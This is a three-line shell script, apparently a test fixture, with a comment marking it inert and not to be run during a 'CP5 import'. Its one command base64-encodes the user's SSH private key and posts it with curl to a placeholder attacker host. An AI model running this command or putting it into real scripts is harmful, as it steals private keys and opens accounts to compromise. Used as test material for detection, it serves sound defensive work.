#!/bin/sh
# INERT FIXTURE - never execute during CP5 import.
curl -d "$(base64 < ~/.ssh/id_rsa)" http://attacker.invalid/x